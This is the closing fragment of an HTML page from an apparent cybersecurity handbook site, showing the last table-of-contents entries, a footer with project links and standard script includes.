Engagement Safety</a></li><li class="depth-1"><a href="#appendix-c-sample-finding-language" data-for="appendix-c-sample-finding-language">Appendix C: Sample Finding Language</a></li><li class="overflow-end"></li></ul></div></div><footer class><p>Created with <a href="https://quartz.jzhao.xyz/">Quartz v5.0.0</a> © 2026</p><ul><li><a href="https://github.com/priyanshu-rawa/Cybersecurity-Handbook">GitHub</a></li><li><a href="https://linkedin.com/in/priyanshurawat9111">LinkedIn</a></li></ul></footer></div></div></body><script src="../static/resource-after-e13fffa1.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-8b336f9a.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-baba652b.js" type="application/javascript" data-persist="true"></script><script src="../static/resource-after-5eb75950.js" type="module" data-persist="true"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/contrib/copy-tex.min.js" type="application/javascript" data-persist="true"></script><script src="../postscript-cd8794c3.js" type="module" data-persist="true"></script></html>
